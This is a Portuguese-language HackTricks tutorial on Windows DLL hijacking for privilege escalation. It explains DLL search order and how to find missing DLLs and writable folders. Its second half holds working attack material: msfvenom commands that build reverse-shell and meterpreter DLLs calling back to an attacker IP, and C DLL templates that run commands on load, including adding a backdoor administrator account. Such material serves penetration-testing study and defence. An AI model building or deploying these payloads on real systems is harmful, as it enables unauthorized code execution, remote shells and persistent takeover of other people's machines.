# Dll Hijacking

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para** os repositórios do [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Informações Básicas

O DLL Hijacking envolve manipular um aplicativo confiável para carregar um DLL malicioso. Esse termo engloba várias táticas como **DLL Spoofing, Injection e Side-Loading**. É principalmente utilizado para execução de código, alcançando persistência e, menos comumente, escalonamento de privilégios. Apesar do foco no escalonamento aqui, o método de sequestro permanece consistente em relação aos objetivos.

### Técnicas Comuns

Várias métodos são empregados para o DLL hijacking, sendo a eficácia de cada um dependente da estratégia de carregamento de DLL do aplicativo:

1. **Substituição de DLL**: Trocar um DLL genuíno por um malicioso, opcionalmente usando DLL Proxying para preservar a funcionalidade do DLL original.
2. **Hijacking da Ordem de Busca de DLL**: Colocar o DLL malicioso em um caminho de busca antes do legítimo, explorando o padrão de busca do aplicativo.
3. **Hijacking de DLL Fantasma**: Criar um DLL malicioso para um aplicativo carregar, pensando que é um DLL necessário inexistente.
4. **Redirecionamento de DLL**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo para o DLL malicioso.
5. **Substituição de DLL WinSxS**: Substituir o DLL legítimo por um malicioso no diretório WinSxS, um método frequentemente associado ao side-loading de DLL.
6. **Hijacking de DLL de Caminho Relativo**: Colocar o DLL malicioso em um diretório controlado pelo usuário com o aplicativo copiado, assemelhando-se às técnicas de Execução de Proxy Binário.

## Encontrando Dlls Ausentes

A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar o [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **seguintes 2 filtros**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

e mostrar apenas a **Atividade do Sistema de Arquivos**:

![](<../../../.gitbook/assets/image (314).png>)

Se você está procurando **dlls ausentes em geral**, deixe isso rodando por alguns **segundos**.\
Se você está procurando uma **dll ausente dentro de um executável específico**, você deve configurar **outro filtro como "Nome do Processo" "contém" "\<nome do exec>", executá-lo e parar de capturar eventos**.

## Explorando Dlls Ausentes

Para escalar privilégios, a melhor chance que temos é ser capaz de **escrever um dll que um processo privilegiado tentará carregar** em algum **local onde ele será pesquisado**. Portanto, seremos capazes de **escrever** um dll em uma **pasta** onde o **dll é pesquisado antes** da pasta onde o **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde o dll será pesquisado** e o **dll original não exista** em nenhuma pasta.

### Ordem de Busca de Dll

Dentro da [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como os Dlls são carregados especificamente**.

**Aplicativos Windows** procuram DLLs seguindo um conjunto de **caminhos de busca predefinidos**, aderindo a uma sequência específica. O problema do sequestro de DLL surge quando um DLL malicioso é estrategicamente colocado em um desses diretórios, garantindo que ele seja carregado antes do DLL autêntico. Uma solução para evitar isso é garantir que o aplicativo use caminhos absolutos ao se referir aos DLLs que requer.

Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:

1. O diretório de onde o aplicativo foi carregado.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho deste diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não há função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório.
5. (_C:\Windows_)
6. O diretório atual.
7. Os diretórios listados na variável de ambiente PATH. Observe que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca de DLL.

Essa é a **ordem de busca padrão com o SafeDllSearchMode ativado**. Quando desativado, o diretório atual sobe para a segunda posição. Para desativar esse recurso, crie o valor do registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é ativado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** a busca começa no diretório do módulo executável que o **LoadLibraryEx** está carregando.

Por fim, observe que **um dll pode ser carregado indicando o caminho absoluto em vez apenas do nome**. Nesse caso, esse dll **será pesquisado apenas nesse caminho** (se o dll tiver dependências, elas serão pesquisadas como carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

#### Exceções na ordem de busca de DLLs da documentação do Windows

Certas exceções à ordem padrão de busca de DLLs são observadas na documentação do Windows:

* Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele verifica se há redirecionamento e um manifesto antes de recorrer à DLL já na memória. **Neste cenário, o sistema não realiza uma busca pela DLL**.
* Nos casos em que a DLL é reconhecida como uma **DLL conhecida** para a versão atual do Windows, o sistema utilizará sua versão da DLL conhecida, juntamente com quaisquer DLLs dependentes, **ignorando o processo de busca**. A chave do registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas DLLs conhecidas.
* Caso uma **DLL tenha dependências**, a busca por essas DLLs dependentes é realizada como se fossem indicadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada por um caminho completo.

### Escalando Privilégios

**Requisitos**:

* Identificar um processo que opera ou operará sob **privilégios diferentes** (movimento horizontal ou lateral), que está **sem uma DLL**.
* Garantir que haja **acesso de escrita** disponível para qualquer **diretório** no qual a **DLL** será **procurada**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
No caso de ter sorte e encontrar-se atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá uma **PoC** de um sequestro de DLL para a versão do Windows que você pode usar (provavelmente apenas alterando o caminho da pasta onde você tem permissões de escrita).

Observe que você pode **verificar suas permissões em uma pasta** fazendo:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **verifique as permissões de todas as pastas dentro do CAMINHO**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Você também pode verificar as importações de um executável e as exportações de uma DLL com:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Para um guia completo sobre como **abusar do Dll Hijacking para escalar privilégios** com permissões para escrever em uma **pasta do Path do Sistema**, confira:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Ferramentas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em alguma pasta dentro do PATH do sistema.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as funções do **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar um dll que exporte pelo menos todas as funções que o executável importará dele**. De qualquer forma, observe que o Dll Hijacking é útil para [escalar do nível de Integridade Média para Alto **(burlando o UAC)**](../../authentication-credentials-uac-and-efs/#uac) ou de [**Alto Integridade para SISTEMA**](../#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar um dll válido** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **modelos** ou para criar um **dll com funções não exigidas exportadas**.

## **Criando e compilando Dlls**

### **Proxificação de Dll**

Basicamente, um **proxy de Dll** é uma Dll capaz de **executar seu código malicioso quando carregado**, mas também de **expor** e **funcionar** como **esperado** ao **repassar todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar um dll proxificado** ou **indicar o Dll** e **gerar um dll proxificado**.

### **Meterpreter**

**Obter shell reverso (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obter um meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Criar um usuário (x86 não vi uma versão x64):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Seu próprio

Observe que em vários casos, a Dll que você compila deve **exportar várias funções** que serão carregadas pelo processo da vítima, se essas funções não existirem, o **binário não conseguirá carregá-las** e o **exploit falhará**.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## Referências

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS de zero a herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
